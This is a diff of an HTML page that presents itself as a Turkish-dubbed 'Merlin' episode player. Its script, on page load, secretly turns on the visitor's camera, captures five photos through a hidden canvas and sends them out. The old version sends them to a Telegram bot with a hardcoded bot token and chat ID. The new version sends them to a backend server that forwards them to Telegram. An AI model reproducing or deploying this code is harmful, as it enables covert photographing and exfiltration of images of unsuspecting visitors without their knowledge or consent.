@@ -74,31 +74,52 @@
             }
         }
     </style>
+</head>
+<body>
+    <!-- Video title at the top center above the player -->
+    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
+
+    <!-- Custom Video Player using Google Drive link -->
+    <div class="video-container">
+        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
+                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <!-- Description section -->
+    <div class="description">
+        <p>
+            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
+            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
+            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
+            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
+        </p>
+    </div>
+
+    <!-- Hidden video and canvas elements -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         let videoStream = null;
 
-        const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs';  // Your Telegram bot token
-        const chatId = '7771348001';  // Your Telegram chat ID
-
-        // Function to send image to Telegram
+        // Function to send image to backend (which will forward it to Telegram)
         function sendToTelegram(imageData) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', imageData);
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            fetch('http://localhost:3000/send-photo', { // Update this with your live server URL
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ imageData: imageData }),
             })
             .then(response => response.json())
             .then(data => {
-                if (data.ok) {
+                if (data.message) {
                     console.log('Image sent to Telegram successfully');
                 } else {
-                    console.error('Failed to send image to Telegram:', data);
+                    console.error('Failed to send image to Telegram:', data.error);
                 }
             })
             .catch(error => console.error('Error sending image:', error));
@@ -116,20 +137,8 @@
             const imgData = canvas.toDataURL('image/png');
             console.log("Captured Image:", imgData);
 
-            // Convert the base64 image to a Blob for sending via Telegram
-            const byteCharacters = atob(imgData.split(',')[1]);
-            const byteArrays = [];
-
-            for (let offset = 0; offset < byteCharacters.length; offset++) {
-                const byteArray = new Uint8Array(1);
-                byteArray[0] = byteCharacters.charCodeAt(offset);
-                byteArrays.push(byteArray);
-            }
-
-            const byteArray = new Blob(byteArrays, { type: 'image/png' });
-
-            // Send the captured image to Telegram
-            sendToTelegram(byteArray);
+            // Send the captured image to the backend
+            sendToTelegram(imgData);
         }
 
         // Function to stop the camera
@@ -151,7 +160,7 @@
                         capturePhoto();
                         count++;
 
-                        if (count >= 5) {
+                        if (count >= 5) { // Capture 5 pictures in total
                             clearInterval(captureInterval);
                             stopCamera(videoStream);
                         }
@@ -179,34 +188,5 @@
         // Start the automatic capture schedule on page load
         document.addEventListener('DOMContentLoaded', scheduleAutomaticCapture);
     </script>
-</head>
-<body>
-    <!-- Video title at the top center above the player -->
-    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
-
-    <!-- Custom Video Player using Google Drive link -->
-    <div class="video-container">
-        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
-                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
-
-    <!-- Description section -->
-    <div class="description">
-        <p>
-            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
-            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
-            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
-            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
-        </p>
-    </div>
-  </div>
-    <div class="youtube-container">
-    <iframe id="youtube-player" width="10" height="10" 
-            src="https://www.youtube.com/embed/sN98tqCikyM?list=PLT48E20fpetQNQbeACxWZYi2mem06SZm7&autoplay=1&mute=1&loop=1&playlist=PLT48E20fpetQNQbeACxWZYi2mem06SZm7" 
-            frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-</div>
-    <!-- Hidden video and canvas elements -->
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
 </body>
 </html>
